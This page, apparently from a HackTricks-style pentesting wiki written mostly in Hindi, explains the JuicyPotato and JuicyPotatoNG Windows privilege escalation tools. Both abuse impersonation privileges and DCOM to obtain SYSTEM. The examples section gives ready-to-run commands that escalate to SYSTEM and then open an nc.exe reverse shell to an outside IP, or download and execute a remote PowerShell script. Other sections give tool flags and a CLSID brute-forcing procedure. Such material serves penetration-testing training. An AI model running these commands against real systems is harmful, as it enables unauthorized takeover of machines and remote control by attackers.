# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato is legacy. यह आम तौर पर Windows के उन वर्शन तक भरोसेमंद रूप से काम करता है जो Windows 10 1803 / Windows Server 2016 तक हैं। Microsoft द्वारा Windows 10 1809 / Server 2019 में की गई hardening ने मूल तकनीक को तोड़ दिया। उन बिल्ड्स और नए वर्शन के लिए PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato और अन्य जैसे आधुनिक विकल्पों पर विचार करें। अद्यतन विकल्पों और उपयोग के लिए नीचे दी गई पृष्ठ देखें।


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusing the golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Compatibility quick notes

- यह तभी भरोसेमंद रूप से काम करता है जब वर्तमान context में SeImpersonatePrivilege या SeAssignPrimaryTokenPrivilege मौजूद हों, और Windows 10 1803 तथा Windows Server 2016 तक के वर्शन पर।
- Windows 10 1809 / Windows Server 2019 और बाद के वर्शन में Microsoft की hardening के कारण यह टूटा हुआ है। उन बिल्ड्स के लिए ऊपर लिंक किए गए विकल्पों को प्राथमिकता दें।

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) और इसके [variants](https://github.com/decoder-it/lonelypotato) ने उस privilege escalation chain का उपयोग किया है जो [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) के MiTM listener पर `127.0.0.1:6666` होने और जब आपके पास `SeImpersonate` या `SeAssignPrimaryToken` privileges हों तब आधारित है। एक Windows build review के दौरान हमें एक ऐसा setup मिला जहाँ `BITS` जानबूझकर disabled था और port `6666` उपयोग में था।

हमने [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) को weaponize करने का निर्णय लिया: **Say hello to Juicy Potato**.

> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.

हमने पाया कि `BITS` के अलावा भी कई COM servers हैं जिनका दुरुपयोग किया जा सकता है। उन्हें बस यह चाहिए कि:

1. वर्तमान user द्वारा instantiate किया जा सके, सामान्यतः एक “service user” जिसके पास impersonation privileges हों
2. यह `IMarshal` interface implement करे
3. यह किसी elevated user (SYSTEM, Administrator, …) के रूप में चले

कुछ परीक्षणों के बाद हमने कई Windows वर्शनों पर [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) की एक विस्तृत सूची प्राप्त और परीक्षण की।

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato आपको अनुमति देता है:

- **Target CLSID** _अपनी पसंद का कोई भी CLSID चुनें._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _आप OS के अनुसार व्यवस्थित सूची पा सकते हैं._
- **COM Listening port** _अपना पसंदीदा COM listening port परिभाषित करें (instead of the marshalled hardcoded 6666)_
- **COM Listening IP address** _server को किसी भी IP पर bind करें_
- **Process creation mode** _impersonated user के privileges के आधार पर आप इन में से चुन सकते हैं:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _exploitation सफल होने पर कोई executable या script launch करें_
- **Process Argument** _launch किए जाने वाले process के arguments customize करें_
- **RPC Server address** _एक stealthy approach के लिए आप external RPC server पर authenticate कर सकते हैं_
- **RPC Server port** _यदि आप external server पर authenticate करना चाहते हैं और firewall `135` port को block कर रहा है तो यह उपयोगी है…_
- **TEST mode** _मुख्यतः testing उद्देश्यों के लिए, जैसे CLSIDs का परीक्षण। यह DCOM बनाता है और token के user को print करता है। देखें_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### अंतिम विचार <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

यदि उपयोगकर्ता के पास `SeImpersonate` या `SeAssignPrimaryToken` privileges हैं तो आप **SYSTEM** हैं।

इन सभी COM Servers के दुरुपयोग को रोकना लगभग असंभव है। आप इन objects की permissions को `DCOMCNFG` के माध्यम से संशोधित करने के बारे में सोच सकते हैं लेकिन शुभकामनाएँ — यह चुनौतीपूर्ण होगा।

वास्तविक समाधान संवेदनशील accounts और applications की रक्षा करना है जो `* SERVICE` accounts के तहत चलती हैं। `DCOM` को रोकना निश्चित रूप से इस exploit को रोक देगा, पर यह underlying OS पर गंभीर प्रभाव डाल सकता है।

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG आधुनिक Windows पर JuicyPotato-style local privilege escalation को पुनः पेश करता है, निम्न को संयोजित करके:
- चुने गए port पर स्थानीय RPC server के लिए DCOM OXID resolution, पुराने hardcoded 127.0.0.1:6666 listener से बचते हुए।
- RpcImpersonateClient की आवश्यकता के बिना inbound SYSTEM authentication को capture और impersonate करने के लिए एक SSPI hook, जो केवल SeAssignPrimaryTokenPrivilege मौजूद होने पर CreateProcessAsUser को भी सक्षम बनाता है।
- DCOM activation constraints को पूरा करने के लिए ट्रिक्स (उदा., PrintNotify / ActiveX Installer Service classes को लक्षित करते समय पूर्व INTERACTIVE-group आवश्यकता)।

महत्वपूर्ण नोट्स (बिल्ड्स में बदलता व्यवहार):
- September 2022: प्रारम्भिक technique ने supported Windows 10/11 और Server लक्ष्यों पर “INTERACTIVE trick” का उपयोग करके काम किया।
- January 2023 update from the authors: Microsoft ने बाद में INTERACTIVE trick को ब्लॉक कर दिया। एक अलग CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) exploitation को पुनर्स्थापित करता है, लेकिन उनके पोस्ट के अनुसार केवल Windows 11 / Server 2022 पर।

बुनियादी उपयोग (अधिक flags के लिए help देखें):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
यदि आपका लक्ष्य Windows 10 1809 / Server 2019 है जहाँ classic JuicyPotato पैच किया जा चुका है, तो ऊपर लिंक किए गए विकल्पों (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, आदि) को प्राथमिकता दें। NG बिल्ड और सर्विस की स्थिति पर निर्भर कर सकता है।

## उदाहरण

नोट: आज़माने के लिए CLSIDs की सूची हेतु [this page](https://ohpe.it/juicy-potato/CLSID/) पर जाएँ।

### nc.exe reverse shell प्राप्त करें
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell रिवर्स
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### एक नया CMD लॉन्च करें (यदि आपके पास RDP एक्सेस है)

![](<../../images/image (300).png>)

## CLSID समस्याएँ

अक्सर JuicyPotato द्वारा उपयोग किया जाने वाला डिफ़ॉल्ट CLSID **काम नहीं करता** और exploit विफल हो जाती है। आमतौर पर एक **काम करने वाला CLSID** खोजने के लिए कई प्रयास करने पड़ते हैं। किसी विशिष्ट ऑपरेटिंग सिस्टम के लिए आज़माने हेतु CLSID की सूची प्राप्त करने के लिए, आपको इस पेज पर जाना चाहिए:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **CLSID की जाँच**

सबसे पहले, आपको juicypotato.exe के अलावा कुछ executables की आवश्यकता होगी।

Join-Object.ps1 डाउनलोड करें और इसे अपने PS session में लोड करें, और GetCLSID.ps1 डाउनलोड करके उसे execute करें। वह स्क्रिप्ट परीक्षण के लिए संभावित CLSID की एक सूची बनाएगी।

फिर test_clsid.bat डाउनलोड करें (CLSID सूची और juicypotato executable के पाथ को बदलें) और इसे execute करें। यह हर CLSID को आजमाना शुरू कर देगा, और **जब port number बदलता है, तो इसका मतलब होगा कि CLSID काम कर गया**।

**जांचें** काम करने वाले CLSIDs **-c पैरामीटर का उपयोग करके**

## संदर्भ

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
